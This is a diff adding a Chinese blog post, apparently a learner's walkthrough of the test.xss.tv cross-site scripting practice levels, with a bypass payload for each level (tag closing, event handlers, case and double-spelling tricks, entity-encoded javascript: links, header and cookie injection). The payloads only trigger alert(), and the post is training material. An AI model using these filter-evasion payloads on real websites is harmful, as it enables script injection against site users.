@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/XFUN%E6%B0%B4%E6%AF%8D%E6%9A%97%E9%BB%91%E7%89%88-%E6%9C%AA%E9%80%89%E4%B8%AD.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/XFUN%E6%B0%B4%E6%AF%8D%E6%9A%97%E9%BB%91%E7%89%88-%E6%9C%AA%E9%80%89%E4%B8%AD.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="xss，没学过，不会做，找点题来练练手闯关网址http:&#x2F;&#x2F;test.xss.tv">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss学习做题wp">
+<meta property="og:url" content="http://example.com/2023/01/18/xss%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98wp/index.html">
+<meta property="og:site_name" content="LinTu&#39;s Blog">
+<meta property="og:description" content="xss，没学过，不会做，找点题来练练手闯关网址http:&#x2F;&#x2F;test.xss.tv">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-01-18T11:50:45.000Z">
+<meta property="article:modified_time" content="2023-07-27T08:54:42.755Z">
+<meta property="article:author" content="林涂">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2023/01/18/xss%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>xss学习做题wp | LinTu's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="LinTu's Blog" type="application/atom+xml">
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">LinTu's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/18/xss%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="林涂">
+      <meta itemprop="description" content="学习ing">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LinTu's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss学习做题wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-01-18 19:50:45" itemprop="dateCreated datePublished" datetime="2023-01-18T19:50:45+08:00">2023-01-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-27 16:54:42" itemprop="dateModified" datetime="2023-07-27T16:54:42+08:00">2023-07-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">做题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2023/01/18/xss%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98wp/" class="post-meta-item leancloud_visitors" data-flag-title="xss学习做题wp" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/01/18/xss%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98wp/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/01/18/xss%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98wp/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>xss，没学过，不会做，找点题来练练手<br>闯关网址<a target="_blank" rel="noopener" href="http://test.xss.tv/">http://test.xss.tv</a></p>
+<span id="more"></span>
+<p>上网看到有个测试神句<code>&lt;script &quot; &#39;Oonn&gt;</code>但是我还不怎么会用</p>
+<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>经典代码<br><code>&lt;script&gt;alert()&lt;/script&gt;</code></p>
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>用用那个什么<code>&lt;script &quot; &#39;Oonn&gt;</code>神句看看<br>搜索框里只出现了<code>&lt;script </code>猜测可以用双引号绕过<br>闭合绕过<br><code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;</code></p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code><br>搜索框里只出现了<code>&lt;script &quot; </code>猜测可以用单引号绕过<br><code>&#39;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&#39;</code><br>左边一个&gt;闭合，右边一个&lt;和末端的&gt;闭合<br>什么单引号也不行？！右键源代码一探究竟<br>看到<code>value=&#39;&amp;lt;script &amp;quot; &#39;Oonn&amp;gt;&#39;</code><br>OMG原来大于小于被转义了！好悲伤的一道题<br>浅浅网上随便找个不用大于小于的<br><code>&#39;onmouseover=&#39;alert()</code>然后点击搜索</p>
+<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code>搜索框里只剩<code>script</code><br>源代码<code>value=&quot;script &quot; &#39;Oonn&quot;</code><br>卡在双引号，大于小于不能用因为被过滤了<br>那不和上一题一样只是单引变双引嘛<br><code>&quot;onmouseover=&quot;alert()</code></p>
+<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>输入<code>&lt;script &quot; &#39;Oonn&gt;</code>搜索框里变成<code>&lt;scr_ipt </code><br>源代码<code>value=&quot;&lt;scr_ipt &quot; &#39;oo_nn&gt;&quot;</code>介个似协模意思捏。。<br>首先哈，大于小于没被转义也没被过滤，然后哈，应该是双引号闭合<br>输<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code>源代码是<code>value=&quot;&quot;&gt;&lt;scr_ipt&gt;alert()&lt;/script&gt;&lt;&quot;&quot;</code><br>输<code>&quot;onmouseover=&quot;alert()</code>源代码是<code>value=&quot;&quot;o_nmouseover=&quot;alert()&quot;</code><br>但是试了<code>&lt;a href=&quot;javascript:alert()&quot;&gt;</code>可以发现是可行的<br>构建，先双引号<code>&quot;</code>然后<code>&gt;</code>和左边闭合，然后<code>&lt;a href=&quot;javascript:alert()&quot;&gt;</code>，<code>&lt;</code>和右边闭合<br><code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;&lt;</code>铛铛出炉</p>
+<p>先做到这，明天继续</p>
+<h3 id="2023-7"><a href="#2023-7" class="headerlink" title="2023.7"></a>2023.7</h3><p>虽然当时打算继续做下去。。但是我一学期后才回来（阿这</p>
+<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>大小写绕过<br><code>&quot;&gt;&lt;a Href=&quot;javaScript:alert()&quot;&gt;&lt;</code></p>
+<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>把上一个输进去发现用了小写转化<br>试了一下发现还会检测<code>on``script``herf</code>然后删掉，双拼写绕过<br><code>&quot;&gt;&lt;a hrhrefef=&quot;javascrscriptipt:alert()&quot;&gt;&lt;</code></p>
+<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>小写转化、过滤了script,href什么的、双引号被编码<br>看了一下会把输入的填进href,搞个&amp;#十进制ASCII<br><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#83;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</code><br>或者&amp;#十六进制ASCII<code>&amp;#x006a;&amp;#x0061;&amp;#x0076;&amp;#x0061;&amp;#x0073;&amp;#x0063;&amp;#x0072;&amp;#x0069;&amp;#x0070;&amp;#x0074;&amp;#x003a;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0027;&amp;#x0078;&amp;#x0073;&amp;#x0073;&amp;#x0027;&amp;#x0029;</code></p>
+<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>双引号,尖括号,还说我链接不合法<br>浅试了个<code>http://</code>,可以<br>试了一下发现payload里只要有<code>http://</code>就可以,不管怎么放,估计是匹配了<code>http://</code><br>把上一题的尾巴后面注释个<code>//http://</code><br><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#83;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;//http://</code></p>
+<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>没框,可能是用图片<br>看看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>有三个隐藏的框,F12把hidden删了,试个<code>&amp;t_link=1&amp;t_history=2&amp;t_sort=3</code>,发现<code>t_sort</code>框里有回显</p>
+<p><code>&amp;t_sort=&quot; onclick=&#39;javascript:alert(1)&#39;&gt;</code>再把hidden删了</p>
+<p>AND还有可以直接改类型,不用一次次删hidden<br><code>&amp;t_sort=&quot; type=&#39;text&#39; onclick=&#39;javascript:alert(1)&#39;&gt;</code></p>
+<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>看看源码,四个框框<br><code>t_link=&quot; type=&#39;text&#39;&gt;&amp;t_history=&quot; type=&#39;text&#39;&gt;&amp;t_sort=&quot; type=&#39;text&#39;&gt;&amp;t_ref=&quot; type=&#39;text&#39;</code><br>没反应<br>再看一眼源码,双引号被转义了<br>然后t_ref的值<br><code>&lt;input name=&quot;t_ref&quot;  value=&quot;https://xss.tesla-space.com/level10.php?keyword=&amp;t_sort=%22%20onclick=%27javascript:alert(1)%27%3E&quot; type=&quot;hidden&quot;&gt;</code><br>然后hackbar可以看到referer的值就是变成了<code>https://xss.tesla-space.com/level10.php?keyword=&amp;t_sort=%22%20onclick=%27javascript:alert(1)%27%3E</code><br>遂改之<code>&quot; type=&#39;text&#39; onclick=&#39;javascript:alert(1)&#39;&gt;</code></p>
+<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>还是没有框框,看看源码<br>有个<code>t_ua</code>,改个User-Agent头看看<br>拒绝访问<br>不改,直接在后面加payload</p>
+<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>看源码,<code>t_cook</code>,改个cookie看看<br><code>user=&quot; type=&#39;text&#39; onclick=&#39;javascript:alert(1)&#39;&gt;</code></p>
+<h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p><code>&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;https://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;</code><br><a target="_blank" rel="noopener" href="https://www.exifviewer.org/%E6%89%93%E4%B8%8D%E5%BC%80">https://www.exifviewer.org/打不开</a><br>不知道要干嘛就是</p>
+<h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p><code>&lt;body&gt;&lt;span class=&quot;ng-include:1.gif&quot;&gt;&lt;/span&gt;&lt;/body&gt; </code><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011127019/article/details/53666528">ng-include指令</a><br>尖括号被转义<br>html包一下<code>%27https://xss.tesla-space.com/level1.php?name=&lt;img src=asd onerror=alert(1)&gt;%27</code></p>
+<h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>过滤了斜杠,空格,Script啥的<br>btw本题配图好眼熟,看到它我就想起了我电脑重置后失踪的steam和不知为何明明是在steam上下的,却离奇留下的portal(显然只留了个壳打不开)<br>找找不用斜杠&#x2F;Script的payload,然后空格编码%0a<br><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/xss/payload.html">4.2.10. Payload — Web安全学习笔记 1.0 文档</a><br><code>&lt;img%0asrc=1%0aonerror=alert(1)&gt;</code></p>
+<h3 id="level17-20"><a href="#level17-20" class="headerlink" title="level17-20"></a>level17-20</h3><p>啥啊该插件不受支持,我再研究研究</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/15/Introduction-to-CryptoHack%E9%83%A8%E5%88%86Write-Up/" rel="prev" title="CryptoHack部分WriteUp">
+      <i class="fa fa-chevron-left"></i> CryptoHack部分WriteUp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/25/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%BA%8C%E5%91%A8Write-Up/" rel="next" title="ROIS冬令营第二周WriteUp">
+      ROIS冬令营第二周WriteUp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=478507889&auto=1&height=66"></iframe>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#level1"><span class="nav-number">1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2"><span class="nav-number">2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-number">3.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4"><span class="nav-number">4.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level5"><span class="nav-number">5.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2023-7"><span class="nav-number">6.</span> <span class="nav-text">2023.7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level6"><span class="nav-number">7.</span> <span class="nav-text">level6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level7"><span class="nav-number">8.</span> <span class="nav-text">level7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level8"><span class="nav-number">9.</span> <span class="nav-text">level8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level9"><span class="nav-number">10.</span> <span class="nav-text">level9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level10"><span class="nav-number">11.</span> <span class="nav-text">level10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level11"><span class="nav-number">12.</span> <span class="nav-text">level11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level12"><span class="nav-number">13.</span> <span class="nav-text">level12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level13"><span class="nav-number">14.</span> <span class="nav-text">level13</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level14"><span class="nav-number">15.</span> <span class="nav-text">level14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level15"><span class="nav-number">16.</span> <span class="nav-text">level15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level16"><span class="nav-number">17.</span> <span class="nav-text">level16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level17-20"><span class="nav-number">18.</span> <span class="nav-text">level17-20</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="林涂"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">林涂</p>
+  <div class="site-description" itemprop="description">学习ing</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/LinTurrr" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;LinTurrr" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">林涂</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'YVmWHQrHLOAW7ewgX1jprtQl-gzGzoHsz',
+      appKey     : 'dY6y287UlOydRGZnN74I8XyY',
+      placeholder: "输入你的评论\\n昵称为必填项目",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '3' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
